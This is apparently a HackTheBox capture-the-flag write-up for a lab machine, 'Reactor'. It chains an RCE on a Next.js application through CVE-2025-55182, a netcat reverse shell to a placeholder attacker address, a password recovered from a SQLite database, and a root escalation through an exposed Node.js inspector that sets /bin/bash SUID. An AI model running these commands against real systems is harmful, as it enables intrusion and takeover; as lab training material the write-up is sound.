# HackTheBox: Reactor Write-up

## Enumeration

I started with an Nmap scan against the target:

```bash
nmap -sSVC -A -Pn <TARGET_IP>
```

The scan revealed SSH and a web application on port 3000:

```text
22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu
3000/tcp open  http     Next.js application
```

The application reports Next.js 15.0.3, a version affected by [CVE-2025-55182](https://nvd.nist.gov/vuln/detail/CVE-2025-55182), a React Server Components remote-code-execution vulnerability.

## Initial Foothold: React Server Components RCE

I used the public [CVE-2025-55182 proof of concept](https://github.com/nehkark/CVE-2025-55182) to execute a reverse-shell command through the application. Start a listener first:

```bash
nc -lvnp 4444
```

Then run the exploit, replacing the target and callback addresses:

```bash
python3 poc-cve-2025-55182.py \
  -u http://<TARGET_IP>:3000 \
  -c 'rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc <ATTACKER_IP> 4444 >/tmp/f'
```

The resulting shell runs as `node` in `/opt/reactor-app`.

## User Ownership: Credentials in the Application Database

The application directory contains a SQLite database. I inspected its strings and found a `users` table with an `engineer` account and a password hash:

```bash
cd /opt/reactor-app
strings reactor.db | head -n 100
```

The hash was crackable; the password recovered for this machine was `reactor1`. I used it to switch to `engineer` and retrieve the user flag:

```bash
su engineer
# Password: reactor1
cat /home/engineer/user.txt
```

The flag value is intentionally omitted.

## Privilege Escalation: Exposed Node.js Inspector

A Node.js inspector was listening locally on port 9229. From the shell on the target, I connected to it:

```bash
node inspect 127.0.0.1:9229
```

At the debugger prompt, I used Node's `child_process` module to make `/bin/bash` SUID-root:

```text
exec process.mainModule.require('child_process').execSync('chmod +s /bin/bash')
```

Back in the shell, the SUID bit allowed me to start a privileged Bash shell and read the root flag:

```bash
/bin/bash -p
cat /root/root.txt
```

The root flag value is intentionally omitted.

## Attack Path

```text
Nmap → Next.js 15.0.3 on port 3000
  ↓
CVE-2025-55182 React Server Components RCE → shell as node
  ↓
SQLite database hash → cracked engineer password → user
  ↓
Node.js inspector on 127.0.0.1:9229 → SUID /bin/bash
  ↓
Root
```

## References

- [NVD — CVE-2025-55182](https://nvd.nist.gov/vuln/detail/CVE-2025-55182)
- [CVE-2025-55182 proof of concept](https://github.com/nehkark/CVE-2025-55182)

> Replace the target and callback IPs with your HTB VPN values. Flag values are intentionally omitted.
